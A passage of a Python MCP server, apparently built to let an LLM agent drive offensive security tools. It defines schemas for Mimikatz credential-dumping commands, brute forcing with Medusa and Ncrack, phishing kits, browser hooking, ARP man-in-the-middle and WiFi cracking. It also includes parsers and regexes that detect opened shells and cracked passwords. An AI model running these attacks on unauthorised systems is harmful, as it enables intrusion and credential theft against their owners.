                },
                "zip_filename": {"type": "string", "description": "Nombre del archivo ZIP de salida"},
            },
            "required": ["target", "username", "password", "domain"],
        })
        
        self._add("mimikatz", "Extraer credenciales con Mimikatz. [ALTO RIESGO]", {
            "properties": {
                "command": {
                    "type": "string",
                    "enum": ["privilege::debug", "sekurlsa::logonpasswords", "lsadump::sam", 
                            "lsadump::secrets", "kerberos::list", "vault::cred", "token::elevate"],
                    "description": "Comando de Mimikatz a ejecutar"
                },
                "remote_ip": {"type": "string", "description": "IP remota (para ejecución remota)"},
                "username": {"type": "string", "description": "Usuario para conexión remota"},
                "password": {"type": "string", "description": "Password para conexión remota"},
                "method": {
                    "type": "string",
                    "enum": ["local", "powershell", "wmi", "winrm"],
                    "description": "Método de ejecución",
                    "default": "local"
                },
            },
            "required": ["command"],
        })
        
        # ========= HERRAMIENTAS DE AUDITORÍA WEB =========
        
        self._add("wpscan", "Escaneo de vulnerabilidades en WordPress. [ALTO RIESGO]", {
            "properties": {
                "target_url": {"type": "string", "description": "URL del WordPress a escanear"},
                "enumerate": {
                    "type": "array",
                    "items": {"type": "string", "enum": ["vp", "ap", "vt", "at", "u", "tt"]},
                    "description": "Componentes a enumerar (vp=plugins vuln, ap=todos plugins, etc.)"
                },
                "username": {"type": "string", "description": "Usuario para ataque de fuerza bruta"},
                "password_list": {"type": "string", "description": "Lista de passwords"},
                "api_token": {"type": "string", "description": "Token de API de WPVulnDB"},
                "plugins_version": {"type": "boolean", "description": "Detectar versiones de plugins", "default": True},
                "random_agent": {"type": "boolean", "description": "Usar user-agent aleatorio", "default": True},
                "stealthy": {"type": "boolean", "description": "Modo sigiloso (menos peticiones)", "default": False},
            },
            "required": ["target_url"],
        })
        
        self._add("joomscan", "Escáner de vulnerabilidades para Joomla.", {
            "properties": {
                "target_url": {"type": "string", "description": "URL del Joomla a escanear"},
                "enumerate": {
                    "type": "string",
                    "enum": ["components", "vuln", "all"],
                    "description": "Tipo de enumeración",
                    "default": "all"
                },
                "cookie": {"type": "string", "description": "Cookie de sesión"},
                "user_agent": {"type": "string", "description": "User-Agent personalizado"},
                "proxy": {"type": "string", "description": "Proxy a usar (ej. http://127.0.0.1:8080)"},
            },
            "required": ["target_url"],
        })
        
        self._add("zap_scan", "Escaneo con OWASP ZAP. [ALTO RIESGO]", {
            "properties": {
                "target_url": {"type": "string", "description": "URL objetivo"},
                "scan_type": {
                    "type": "string",
                    "enum": ["spider", "active", "passive", "full"],
                    "description": "Tipo de escaneo",
                    "default": "full"
                },
                "api_key": {"type": "string", "description": "API key de ZAP"},
                "port": {"type": "integer", "description": "Puerto de la API de ZAP", "default": 8080},
                "context_name": {"type": "string", "description": "Nombre del contexto"},
                "include_patterns": {"type": "array", "items": {"type": "string"}, "description": "Patrones URL a incluir"},
                "exclude_patterns": {"type": "array", "items": {"type": "string"}, "description": "Patrones URL a excluir"},
                "max_children": {"type": "integer", "description": "Máximo hijos para spider", "default": 5},
            },
            "required": ["target_url"],
        })
        
        # ========= HERRAMIENTAS DE FUERZA BRUTA AVANZADA =========
        
        self._add("medusa_bruteforce", "Ataque de fuerza bruta con Medusa. [ALTO RIESGO]", {
            "properties": {
                "target": {"type": "string", "description": "IP o hostname objetivo"},
                "service": {
                    "type": "string",
                    "enum": ["ssh", "ftp", "telnet", "http", "pop3", "imap", "smb", "mysql", "mssql", "postgres"],
                    "description": "Servicio a atacar"
                },
                "username": {"type": "string", "description": "Usuario único"},
                "user_list": {"type": "string", "description": "Archivo de usuarios"},
                "password_list": {"type": "string", "description": "Archivo de passwords"},
                "port": {"type": "integer", "description": "Puerto específico"},
                "threads": {"type": "integer", "description": "Hilos paralelos", "default": 5},
                "timeout": {"type": "integer", "description": "Timeout en segundos", "default": 10},
                "verbose": {"type": "boolean", "description": "Modo verbose", "default": False},
            },
            "required": ["target", "service", "password_list"],
        })
        
        self._add("ncrack_bruteforce", "Ataque de fuerza bruta de alta velocidad con Ncrack. [ALTO RIESGO]", {
            "properties": {
                "target": {"type": "string", "description": "IP:puerto o rango (ej. 192.168.1.1:22)"},
                "service": {
                    "type": "string",
                    "enum": ["ssh", "rdp", "ftp", "telnet", "http", "https", "smb", "mysql", "vnc"],
                    "description": "Servicio a atacar"
                },
                "user_list": {"type": "string", "description": "Archivo de usuarios"},
                "pass_list": {"type": "string", "description": "Archivo de passwords"},
                "timing": {
                    "type": "string",
                    "enum": ["T0", "T1", "T2", "T3", "T4", "T5"],
                    "description": "Timing template",
                    "default": "T3"
                },
                "port": {"type": "integer", "description": "Puerto"},
                "connections": {"type": "integer", "description": "Conexiones paralelas", "default": 5},
                "save": {"type": "string", "description": "Archivo para guardar resultados"},
            },
            "required": ["target", "service", "user_list", "pass_list"],
        })
        
        # ========= HERRAMIENTAS DE INGENIERÍA SOCIAL =========
        
        self._add("setoolkit", "Social Engineering Toolkit. [ALTO RIESGO]", {
            "properties": {
                "attack_vector": {
                    "type": "integer",
                    "enum": [1, 2, 3, 4, 5],
                    "description": "Vector de ataque: 1=Spear-Phishing, 2=Web Attack, 3=Infectious Media, 4=Create Payload, 5=Mass Mailer"
                },
                "web_attack_type": {
                    "type": "integer",
                    "enum": [1, 2, 3, 4],
                    "description": "Tipo de ataque web: 1=Java Applet, 2=Metasploit, 3=Credential Harvester, 4=Tabnabbing"
                },
                "clone_url": {"type": "string", "description": "URL a clonar para Credential Harvester"},
                "payload": {"type": "string", "description": "Payload a generar"},
                "lhost": {"type": "string", "description": "IP del listener"},
                "lport": {"type": "integer", "description": "Puerto del listener"},
                "email_template": {"type": "string", "description": "Plantilla de email"},
                "target_email": {"type": "string", "description": "Email objetivo"},
            },
            "required": ["attack_vector"],
        })
        
        self._add("beef_start", "Iniciar y controlar BeEF (Browser Exploitation Framework). [ALTO RIESGO]", {
            "properties": {
                "action": {
                    "type": "string",
                    "enum": ["start", "stop", "status", "hook", "command"],
                    "description": "Acción a realizar",
                    "default": "start"
                },
                "port": {"type": "integer", "description": "Puerto de la interfaz web", "default": 3000},
                "target_url": {"type": "string", "description": "URL para inyectar hook (para acción 'hook')"},
                "command_module": {"type": "string", "description": "Módulo de comando a ejecutar"},
                "hook_id": {"type": "string", "description": "ID del browser hookeado"},
                "options": {"type": "object", "description": "Opciones para el módulo de comando"},
            },
        })
        
        # ========= HERRAMIENTAS DE ANÁLISIS DE RED =========
        
        self._add("tcpdump_capture", "Capturar tráfico de red con tcpdump.", {
            "properties": {
                "interface": {"type": "string", "description": "Interfaz de red", "default": "eth0"},
                "filter": {"type": "string", "description": "Filtro BPF (ej. 'port 80')"},
                "count": {"type": "integer", "description": "Número de paquetes a capturar", "default": 100},
                "output_file": {"type": "string", "description": "Archivo de salida (.pcap)"},
                "verbose": {"type": "boolean", "description": "Salida detallada", "default": False},
                "duration": {"type": "integer", "description": "Duración de captura en segundos"},
            },
            "required": ["interface"],
        })
        
        self._add("ettercap_mitm", "Ataques MITM con Ettercap. [ALTO RIESGO]", {
            "properties": {
                "target1": {"type": "string", "description": "IP objetivo 1 (víctima)"},
                "target2": {"type": "string", "description": "IP objetivo 2 (gateway)"},
                "interface": {"type": "string", "description": "Interfaz de red", "default": "eth0"},
                "attack_type": {
                    "type": "string",
                    "enum": ["arp", "dhcp", "port", "icmp"],
                    "description": "Tipo de ataque",
                    "default": "arp"
                },
                "filters": {"type": "array", "items": {"type": "string"}, "description": "Filtros a aplicar"},
                "plugins": {"type": "array", "items": {"type": "string"}, "description": "Plugins a cargar"},
                "mode": {
                    "type": "string",
                    "enum": ["text", "curses", "daemon"],
                    "description": "Modo de interfaz",
                    "default": "text"
                },
            },
            "required": ["target1", "target2"],
        })
        
        # ========= HERRAMIENTAS DE AUDITORÍA WIFI =========
        
        self._add("aircrack_suite", "Suite Aircrack-ng para auditoría WiFi. [ALTO RIESGO]", {
            "properties": {
                "command": {
                    "type": "string",
                    "enum": ["airodump", "aireplay", "aircrack", "airmon", "packetforge"],
                    "description": "Comando de aircrack-ng a ejecutar"
                },
                "interface": {"type": "string", "description": "Interfaz WiFi"},
                "bssid": {"type": "string", "description": "BSSID del objetivo"},
                "channel": {"type": "integer", "description": "Canal"},
                "essid": {"type": "string", "description": "ESSID del objetivo"},
                "capture_file": {"type": "string", "description": "Archivo de captura"},
                "wordlist": {"type": "string", "description": "Wordlist para crackear"},
                "attack_type": {
                    "type": "string",
                    "enum": ["deauth", "arp", "fragment", "cafe"],
                    "description": "Tipo de ataque (para aireplay)"
                },
                "client": {"type": "string", "description": "MAC del cliente asociado"},
                "output_prefix": {"type": "string", "description": "Prefijo para archivos de salida"},
            },
            "required": ["command"],
        })
        
        self._add("wifite_audit", "Auditoría automatizada de WiFi con Wifite. [ALTO RIESGO]", {
            "properties": {
                "interface": {"type": "string", "description": "Interfaz WiFi", "default": "wlan0"},
                "target_bssid": {"type": "string", "description": "BSSID específico a atacar"},
                "target_channel": {"type": "integer", "description": "Canal específico"},
                "attack": {
                    "type": "string",
                    "enum": ["wep", "wpa", "wps"],
                    "description": "Tipo de ataque",
                    "default": "wpa"
                },
                "wordlist": {"type": "string", "description": "Wordlist para WPA handshake"},
                "wps_pin": {"type": "boolean", "description": "Intentar ataque WPS PIN", "default": True},
                "no_wps": {"type": "boolean", "description": "No usar ataques WPS", "default": False},
                "power": {"type": "integer", "description": "Señal mínima (-dB)", "default": -80},
                "clients": {"type": "boolean", "description": "Mostrar clientes conectados", "default": True},
                "wep_attack": {
                    "type": "string",
                    "enum": ["arp", "chopchop", "fragment"],
                    "description": "Ataque WEP específico"
                },
            },
            "required": ["interface"],
        })
        
        # ========= HERRAMIENTAS DE GENERACIÓN DE WORDLISTS =========
        
        self._add("crunch_gen", "Generar wordlists personalizadas con Crunch.", {
            "properties": {
                "min_length": {"type": "integer", "description": "Longitud mínima", "minimum": 1},
                "max_length": {"type": "integer", "description": "Longitud máxima"},
                "charset": {"type": "string", "description": "Conjunto de caracteres (ej. '0123456789')"},
                "pattern": {"type": "string", "description": "Patrón (ej. @@@%%% para 3 letras + 3 números)"},
                "output_file": {"type": "string", "description": "Archivo de salida"},
                "start_string": {"type": "string", "description": "String de inicio"},
                "stop_string": {"type": "string", "description": "String de parada"},
                "compress": {"type": "boolean", "description": "Comprimir salida", "default": False},
            },
            "required": ["min_length", "max_length"],
        })
        
        self._add("cewl_gen", "Generar wordlists personalizadas desde URLs con CeWL.", {
            "properties": {
                "target_url": {"type": "string", "description": "URL objetivo"},
                "depth": {"type": "integer", "description": "Profundidad de spider", "default": 2},
                "min_word_length": {"type": "integer", "description": "Longitud mínima de palabra", "default": 3},
                "max_word_length": {"type": "integer", "description": "Longitud máxima de palabra", "default": 20},
                "output_file": {"type": "string", "description": "Archivo de salida"},
                "with_numbers": {"type": "boolean", "description": "Incluir números", "default": False},
                "email_addresses": {"type": "boolean", "description": "Extraer emails", "default": False},
                "meta_data": {"type": "boolean", "description": "Extraer metadata", "default": False},
                "user_agent": {"type": "string", "description": "User-Agent personalizado"},
                "proxy": {"type": "string", "description": "Proxy a usar"},
            },
            "required": ["target_url"],
        })


# ---------------------------------------------------------------------------
# [MEJORA 3] Output parsers
# ---------------------------------------------------------------------------

class OutputParsers:
    """Parse raw CLI output from tools into structured JSON."""

    @staticmethod
    def parse_nmap_xml(xml_str: str) -> Optional[dict]:
        """Parse Nmap XML output into structured JSON."""
        try:
            root = ET.fromstring(xml_str)
        except ET.ParseError:
            return None

        result: dict[str, Any] = {
            "scanner": root.get("scanner", "nmap"),
            "args": root.get("args", ""),
            "start_time": root.get("startstr", ""),
            "hosts": [],
        }
        for host_el in root.findall("host"):
            host_info: dict[str, Any] = {"status": "", "addresses": [], "hostnames": [], "ports": []}
            status = host_el.find("status")
            if status is not None:
                host_info["status"] = status.get("state", "")
            for addr in host_el.findall("address"):
                host_info["addresses"].append({"addr": addr.get("addr", ""), "type": addr.get("addrtype", "")})
            for hn in host_el.findall(".//hostname"):
                host_info["hostnames"].append(hn.get("name", ""))
            ports_el = host_el.find("ports")
            if ports_el is not None:
                for port_el in ports_el.findall("port"):
                    port_info: dict[str, Any] = {
                        "port": port_el.get("portid", ""),
                        "protocol": port_el.get("protocol", ""),
                    }
                    state = port_el.find("state")
                    if state is not None:
                        port_info["state"] = state.get("state", "")
                    service = port_el.find("service")
                    if service is not None:
                        port_info["service"] = service.get("name", "")
                        port_info["product"] = service.get("product", "")
                        port_info["version"] = service.get("version", "")
                    scripts_out = []
                    for script_el in port_el.findall("script"):
                        scripts_out.append({"id": script_el.get("id", ""), "output": script_el.get("output", "")})
                    if scripts_out:
                        port_info["scripts"] = scripts_out
                    host_info["ports"].append(port_info)
            result["hosts"].append(host_info)

        run_stats = root.find("runstats/finished")
        if run_stats is not None:
            result["summary"] = run_stats.get("summary", "")
            result["elapsed"] = run_stats.get("elapsed", "")
        return result

    @staticmethod
    def parse_gobuster(raw: str) -> Optional[dict]:
        """Parse Gobuster output into structured list of discovered paths."""
        lines = raw.strip().split("\n")
        findings = []
        for line in lines:
            # Gobuster format: /path (Status: 200) [Size: 1234]
            match = re.match(r"^(/\S+)\s+\(Status:\s*(\d+)\)\s*(?:\[Size:\s*(\d+)\])?", line)
            if match:
                findings.append({
                    "path": match.group(1),
                    "status": int(match.group(2)),
                    "size": int(match.group(3)) if match.group(3) else None,
                })
        if findings:
            return {"discovered_paths": findings, "total_found": len(findings)}
        return None

    @staticmethod
    def parse_nikto(raw: str) -> Optional[dict]:
        """Parse Nikto output into structured vulnerability list."""
        lines = raw.strip().split("\n")
        vulns = []
        server_info = {}
        for line in lines:
            line = line.strip()
            # Server header info
            if line.startswith("+ Server:"):
                server_info["server"] = line.replace("+ Server:", "").strip()
            elif line.startswith("+ Target IP:"):
                server_info["target_ip"] = line.replace("+ Target IP:", "").strip()
            elif line.startswith("+ Target Hostname:"):
                server_info["target_hostname"] = line.replace("+ Target Hostname:", "").strip()
            elif line.startswith("+ Target Port:"):
                server_info["target_port"] = line.replace("+ Target Port:", "").strip()
            # Vulnerability lines start with + and contain OSVDB or descriptive text
            elif line.startswith("+") and len(line) > 3 and not line.startswith("+ Start") and not line.startswith("+ End"):
                osvdb = ""
                match = re.search(r"OSVDB-(\d+)", line)
                if match:
                    osvdb = f"OSVDB-{match.group(1)}"
                vulns.append({
                    "finding": line.lstrip("+ ").strip(),
                    "osvdb": osvdb,
                })
        if vulns or server_info:
            return {"server_info": server_info, "findings": vulns, "total_findings": len(vulns)}
        return None

    @staticmethod
    def parse_hydra(raw: str) -> Optional[dict]:
        """Parse Hydra output to extract found credentials."""
        lines = raw.strip().split("\n")
        creds = []
        for line in lines:
            # Hydra format: [port][service] host:   login: user   password: pass
            match = re.search(r"login:\s*(\S+)\s+password:\s*(\S+)", line)
            if match:
                creds.append({
                    "username": match.group(1),
                    "password": match.group(2),
                })
        if creds:
            return {"credentials_found": creds, "total_found": len(creds)}
        return None

    @staticmethod
    def parse_whatweb(raw: str) -> Optional[dict]:
        """Parse WhatWeb output into technology list."""
        lines = raw.strip().split("\n")
        technologies = []
        for line in lines:
            if not line.strip():
                continue
            # WhatWeb outputs comma-separated plugins per line
            parts = re.findall(r"(\S+)\[([^\]]*)\]", line)
            for name, detail in parts:
                technologies.append({"technology": name, "detail": detail})
            # Also capture items without brackets
            simple = re.findall(r"(?:^|\s)([A-Za-z][\w.-]+)(?:\s|,|$)", line)
            for s in simple:
                if not any(t["technology"] == s for t in technologies):
                    technologies.append({"technology": s, "detail": ""})
        if technologies:
            return {"technologies": technologies, "total": len(technologies)}
        return None


# ---------------------------------------------------------------------------
# Evidence Validation Layer — anti-hallucination gate
# ---------------------------------------------------------------------------

@dataclass
class EvidenceVerdict:
    """Machine-readable evidence assessment attached to every tool result."""

    tool: str
    has_findings: bool
    evidence_type: str  # "parsed_data" | "confirmation_string" | "artifact_file" | "none"
    finding_count: int
    finding_summary: list[str] = field(default_factory=list)
    raw_truncated: bool = False
    execution_status: str = "success"  # "success" | "timeout" | "error" | "empty"
    no_findings: bool = True

    _LANGUAGE_RULE = (
        "LANGUAGE RULE: Respond in the same language the user is writing in. "
        "If the user writes in Spanish, respond in Spanish. "
        "If in English, respond in English. "
        "Technical terms (tool names, CVEs, commands) stay in English."
    )

    def to_header(self) -> str:
        """Render as a structured block the LLM must treat as authoritative."""
        if self.no_findings:
            status_line = f"status: {self.execution_status}"
            if self.execution_status == "timeout":
                body = "Execution incomplete. No verifiable results."
            elif self.execution_status == "error":
                body = "Tool execution failed. No verifiable results."
            else:
                body = "No confirmed vulnerability. No verifiable evidence produced."
            return (
                f"[EVIDENCE GATE — {self.tool}]\n"
                f"{status_line}\n"
                f"NO_FINDINGS: true\n"
                f"{body}\n"
                f"{self._LANGUAGE_RULE}\n"
                f"[END EVIDENCE GATE]\n"
            )
        lines = [
            f"[EVIDENCE GATE — {self.tool}]",
            f"status: {self.execution_status}",
            f"has_findings: true",
            f"evidence_type: {self.evidence_type}",
            f"finding_count: {self.finding_count}",
            "verified_facts:",
        ]
        for s in self.finding_summary:
            lines.append(f"  - {s}")
        lines.append(
            "IMPORTANT: Only the facts listed above are confirmed. "
            "Do not infer additional vulnerabilities."
        )
        lines.append(self._LANGUAGE_RULE)
        lines.append("[END EVIDENCE GATE]")
        return "\n".join(lines) + "\n"

    def to_dict(self) -> dict:
        """Serialize for database storage."""
        return {
            "tool": self.tool,
            "has_findings": self.has_findings,
            "evidence_type": self.evidence_type,
            "finding_count": self.finding_count,
            "finding_summary": self.finding_summary,
            "execution_status": self.execution_status,
            "no_findings": self.no_findings,
        }


class EvidenceValidator:
    """
    Inspects raw tool results against strict evidence rules and produces a
    machine-readable EvidenceVerdict.  The verdict is prepended to every tool
    response so the LLM can only summarize verified structured facts.
    """

    # Regex patterns that constitute hard proof per tool
    CONFIRMATION_PATTERNS: dict[str, list[re.Pattern]] = {
        "sqlmap_scan": [
            re.compile(r"parameter ['\"].*?['\"] is (?:injectable|vulnerable)", re.I),
            re.compile(r"retrieved:\s+\S+", re.I),
            re.compile(r"dumped to", re.I),
            re.compile(r"Type:\s+\w+.*injection", re.I),
        ],
        "hashcat_crack": [
            re.compile(r"^[a-fA-F0-9\$\.\/]{10,}:.+", re.M),  # hash:plaintext
            re.compile(r"Recovered\.*:\s*(\d+)/", re.I),
        ],
        "john_crack": [
            re.compile(r"^(\S+)\s+\((.+?)\)\s*$", re.M),  # plaintext (username)
            re.compile(r"\d+ password hashes? cracked", re.I),
        ],
        "msf_console": [
            re.compile(r"Meterpreter session (\d+) opened", re.I),
            re.compile(r"Command shell session (\d+) opened", re.I),
            re.compile(r"session (\d+) opened", re.I),
        ],
        "crackmapexec": [
            re.compile(r"\[\+\]", re.I),  # CrackMapExec success marker
            re.compile(r"Pwn3d!", re.I),
        ],
        "responder_poison": [
            re.compile(r"\[HTTP\].*NTLMv\d", re.I),
            re.compile(r"Hash\s*:\s*\S+", re.I),
        ],
    }

    # Tools whose parsed "findings" are informational, not confirmed vulns
    _INFORMATIONAL_TOOLS: set[str] = {
        "nikto_scan", "whatweb_scan", "nmap_scan", "gobuster_dir",
        "wapiti_scan", "searchsploit",
    }

    def validate(
        self,
        tool_name: str,
        result: dict,
        artifact_paths: Optional[list[str]] = None,
    ) -> EvidenceVerdict:
        """Inspect a tool result dict and return a verdict."""

        # ── 1. Handle error / timeout ─────────────────────────────────────
        if result.get("isError"):
            text = result["content"][0].get("text", "") if result.get("content") else ""
            if "timed out" in text.lower():
                return EvidenceVerdict(
                    tool=tool_name, has_findings=False, evidence_type="none",
                    finding_count=0, execution_status="timeout", no_findings=True,
                )
            return EvidenceVerdict(
                tool=tool_name, has_findings=False, evidence_type="none",
                finding_count=0, execution_status="error", no_findings=True,
            )

        output_text = (
            result["content"][0].get("text", "") if result.get("content") else ""
        )

        # ── 2. Empty output ───────────────────────────────────────────────
        if not output_text.strip():
            return EvidenceVerdict(
                tool=tool_name, has_findings=False, evidence_type="none",
                finding_count=0, execution_status="empty", no_findings=True,
            )

        truncated = len(output_text) > 40_000

        # ── 3. Artifact file check ────────────────────────────────────────
        if artifact_paths:
            valid_artifacts = []
            for ap in artifact_paths:
                ok, size = self._check_artifact(ap)
                if ok:
                    valid_artifacts.append(f"artifact:{ap} ({size} bytes)")
            if valid_artifacts:
                return EvidenceVerdict(
                    tool=tool_name, has_findings=True,
                    evidence_type="artifact_file",
                    finding_count=len(valid_artifacts),
                    finding_summary=valid_artifacts,
                    raw_truncated=truncated,
                    execution_status="success", no_findings=False,
                )

        # ── 4. Structured JSON parsing ────────────────────────────────────
        parsed = self._try_parse_json(output_text)
        if parsed:
            count, summaries = self._extract_from_parsed(tool_name, parsed)
            if count > 0:
                return EvidenceVerdict(
                    tool=tool_name, has_findings=True,
                    evidence_type="parsed_data",
                    finding_count=count,
                    finding_summary=summaries,
                    raw_truncated=truncated,
                    execution_status="success", no_findings=False,
                )

        # ── 5. Confirmation string matching ───────────────────────────────
        patterns = self.CONFIRMATION_PATTERNS.get(tool_name, [])
        matches: list[str] = []
        for pat in patterns:
            for m in pat.finditer(output_text):
                matches.append(m.group(0).strip())
        if matches:
            # Deduplicate while preserving order
            seen: set[str] = set()
            unique: list[str] = []
            for m in matches:
                if m not in seen:
                    seen.add(m)
                    unique.append(m)
            return EvidenceVerdict(
                tool=tool_name, has_findings=True,
                evidence_type="confirmation_string",
                finding_count=len(unique),
                finding_summary=unique[:20],
                raw_truncated=truncated,
                execution_status="success", no_findings=False,
            )

        # ── 6. No evidence gate passed ────────────────────────────────────
        return EvidenceVerdict(
            tool=tool_name, has_findings=False, evidence_type="none",
            finding_count=0, raw_truncated=truncated,
            execution_status="success", no_findings=True,
        )

    # -- internal helpers ---------------------------------------------------

    @staticmethod
    def _try_parse_json(text: str) -> Optional[dict]:
        """Attempt to parse text as JSON; return None on failure."""
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                return data
        except (json.JSONDecodeError, TypeError):
            pass
        return None

    @staticmethod
    def _check_artifact(path: str) -> tuple[bool, int]:
        """Return (exists_and_nonempty, size_bytes)."""
        try:
            p = Path(path)
            if p.exists() and p.stat().st_size > 0:
                return True, p.stat().st_size
        except OSError:
            pass
        return False, 0

    def _extract_from_parsed(
        self, tool: str, data: dict
    ) -> tuple[int, list[str]]:
        """Return (count, summary_lines) from a parsed JSON result."""

        if tool == "nmap_scan":
            ports: list[str] = []
            for host in data.get("hosts", []):
                addr = ""
                addrs = host.get("addresses", [])
                if addrs:
                    addr = addrs[0].get("addr", "")
                for p in host.get("ports", []):
                    if p.get("state") == "open":
                        svc = p.get("service", "unknown")
                        ver = p.get("version", "")
                        label = f"{addr} {p['port']}/{p.get('protocol', 'tcp')} open {svc}"
                        if ver:
                            label += f" {ver}"
                        ports.append(label.strip())
            return len(ports), ports[:30]

        if tool == "gobuster_dir":
            paths = data.get("discovered_paths", [])
            return len(paths), [
                f"{p['path']} (HTTP {p['status']})" for p in paths[:20]
            ]

        if tool == "hydra_attack":
            creds = data.get("credentials_found", [])
            return len(creds), [
                f"{c['username']}:{c['password']}" for c in creds
            ]

        if tool == "nikto_scan":
            findings = data.get("findings", [])
            return len(findings), [
                f"[info] {f['finding'][:100]}" for f in findings[:20]
            ]

        if tool == "whatweb_scan":
            techs = data.get("technologies", [])
            return len(techs), [
                f"[tech] {t['technology']}" for t in techs[:20]
            ]

        if tool == "searchsploit":
            exploits = data.get("RESULTS_EXPLOIT", data.get("results", []))
            if isinstance(exploits, list):
                return len(exploits), [
                    f"[exploit] {e.get('Title', str(e))[:100]}" for e in exploits[:20]
                ]

        # Generic fallback: count items in the first list-valued key
        for key, val in data.items():
            if isinstance(val, list) and len(val) > 0:
                return len(val), [f"{key}: {len(val)} items found"]

        return 0, []


# ---------------------------------------------------------------------------
# Knowledge Loader — dynamic tactical context injection
# ---------------------------------------------------------------------------

class KnowledgeLoader:
    """
    Loads relevant knowledge markdown files on-demand based on the current
    tool call and scan results.  Keeps injected context under a token budget
    suitable for 7B models.

    Integration point: called by MCPServer before returning tool results so
    the LLM receives tactical guidance alongside raw output.
    """

    KNOWLEDGE_DIR = BASE_DIR / "knowledge"

    # Maps every MCP tool name → its primary knowledge file (relative to KNOWLEDGE_DIR)
    TOOL_KNOWLEDGE_MAP: dict[str, str] = {
        # Recon
        "nmap_scan":          "tools/nmap.md",
        "whatweb_scan":       "tools/whatweb.md",
        "whois_lookup":       "tools/whois.md",
        "dig_lookup":         "tools/dig.md",
        # Web
        "gobuster_dir":       "tools/gobuster.md",
        "nikto_scan":         "tools/nikto.md",
        "wfuzz_scan":         "tools/wfuzz.md",
        "dirb_scan":          "tools/dirb.md",
        "owasp_zap":          "tools/web_scanners.md",
        "burpsuite":          "tools/web_scanners.md",
        "wpscan":             "tools/web_scanners.md",
        "joomscan":           "tools/web_scanners.md",
        "drupwn":             "tools/web_scanners.md",
        "droopescan":         "tools/web_scanners.md",
        # Exploitation
        "sqlmap_scan":        "tools/sqlmap.md",
        "searchsploit_query": "tools/searchsploit.md",
        "msf_console":        "tools/metasploit.md",
        "msfvenom":           "tools/metasploit.md",
        "msf_db":             "tools/metasploit.md",
        "metasploit_resource":"tools/metasploit.md",
        "msf_payload_generator": "tools/metasploit.md",
        # Credential Attacks
        "hydra_attack":       "tools/hydra.md",
        "medusa":             "tools/brute_alt.md",
        "ncrack":             "tools/brute_alt.md",
        "patator":            "tools/brute_alt.md",
        "xhydra":             "tools/brute_alt.md",
        "hashcat_crack":      "tools/hashcat.md",
        "john_crack":         "tools/john.md",
        "crunch":             "tools/wordlist_gen.md",
        "cewl":               "tools/wordlist_gen.md",
        # SMB/AD/Windows
        "enum4linux_scan":    "tools/enum4linux.md",
        "smbclient":          "tools/smbclient.md",
        "smbmap":             "tools/smb_advanced.md",
        "rpcclient":          "tools/smb_advanced.md",
        "bloodhound":         "tools/ad_tools.md",
        "crackmapexec":       "tools/ad_tools.md",
        "evil_winrm":         "tools/ad_tools.md",
        "impacket":           "tools/ad_tools.md",
        "psexec":             "tools/ad_tools.md",
        "wmiexec":            "tools/ad_tools.md",
        "smbexec":            "tools/ad_tools.md",
        "secretsdump":        "tools/ad_tools.md",
        "mimikatz":           "tools/ad_tools.md",
        "pth_tools":          "tools/ad_tools.md",
        # Network
        "netcat_connect":     "tools/netcat.md",
        "bettercap":          "tools/mitm.md",
        "ettercap":           "tools/mitm.md",
        "responder":          "tools/mitm.md",
        "mitmproxy":          "tools/mitm.md",
        # Wireless
        "aircrack_ng":        "tools/wireless.md",
        "reaver":             "tools/wireless.md",
        "bully":              "tools/wireless.md",
        "wifite":             "tools/wireless.md",
        # Social Engineering & C2
        "setoolkit":          "tools/social_engineering.md",
        "beef_start":         "tools/social_engineering.md",
        "empire":             "tools/social_engineering.md",
        "cobaltstrike":       "tools/social_engineering.md",
        "veil":               "tools/social_engineering.md",
        "shellter":           "tools/social_engineering.md",
        "powersploit":        "tools/social_engineering.md",
    }

    # Tools that should also load interpretation/context files
    _WEB_TOOLS = frozenset([
        "whatweb_scan", "gobuster_dir", "nikto_scan", "wfuzz_scan", "dirb_scan",
        "owasp_zap", "burpsuite", "wpscan", "joomscan", "drupwn", "droopescan",
    ])
    _SMB_TOOLS = frozenset([
        "enum4linux_scan", "smbclient", "smbmap", "rpcclient",
    ])
    _BRUTE_TOOLS = frozenset([
        "hydra_attack", "medusa", "ncrack", "patator", "xhydra",
    ])
    _HASH_TOOLS = frozenset(["hashcat_crack", "john_crack"])

    # Approximate tokens per character (conservative for markdown)
    _CHARS_PER_TOKEN = 3.5
    _MAX_BUDGET_TOKENS = 2500
    _MAX_BUDGET_CHARS = int(_MAX_BUDGET_TOKENS * _CHARS_PER_TOKEN)  # ~8750 chars

    def __init__(self, logger: logging.Logger) -> None:
        self._log = logger
        # In-memory cache: relative_path → file content string
        self._cache: dict[str, str] = {}

    def _load_file(self, relative_path: str) -> str:
        """Load a single knowledge file, with caching. Returns '' on missing file."""
        if relative_path in self._cache:
            return self._cache[relative_path]

        full_path = self.KNOWLEDGE_DIR / relative_path
        try:
            content = full_path.read_text(encoding="utf-8")
            self._cache[relative_path] = content
            return content
        except FileNotFoundError:
            self._log.debug("Knowledge file not found: %s", full_path)
            self._cache[relative_path] = ""
            return ""
        except Exception as exc:
            self._log.warning("Failed to read knowledge file %s: %s", full_path, exc)
            return ""

    def _truncate_to_budget(self, sections: list[str]) -> str:
        """Join sections and truncate to token budget, cutting at last full line."""
        combined = "\n\n".join(s for s in sections if s)
        if len(combined) <= self._MAX_BUDGET_CHARS:
            return combined
        # Cut at budget, then back up to last newline for clean break
        truncated = combined[:self._MAX_BUDGET_CHARS]
        last_nl = truncated.rfind("\n")
        if last_nl > self._MAX_BUDGET_CHARS // 2:
            truncated = truncated[:last_nl]
        return truncated + "\n[...truncated to fit context budget]"

    def get_context(self, tool_name: str, scan_results: str = "") -> str:
        """
        Build tactical context for a tool call.  Returns a formatted string
        ready to prepend to the tool result, or '' if no knowledge applies.

        Layers:
          1. Tool-specific knowledge (tools/*.md)
          2. Context-aware interpretation files
          3. Result-based triggers (pattern matching on scan output)
        """
        sections: list[str] = []
        loaded_files: set[str] = set()  # deduplicate

        def _add(relative_path: str) -> None:
            if relative_path not in loaded_files:
                content = self._load_file(relative_path)
                if content:
                    loaded_files.add(relative_path)
                    sections.append(content)

        # --- Layer 1: tool-specific knowledge ---
        if tool_name in self.TOOL_KNOWLEDGE_MAP:
            _add(self.TOOL_KNOWLEDGE_MAP[tool_name])

        # --- Layer 2: context-aware interpretation ---
        if tool_name == "nmap_scan":
            _add("interpretation/ports.md")
            _add("pivot_map.md")
        elif tool_name in self._WEB_TOOLS:
            _add("interpretation/web.md")
            _add("pivot_map.md")
        elif tool_name in self._SMB_TOOLS:
            _add("pivot_map.md")
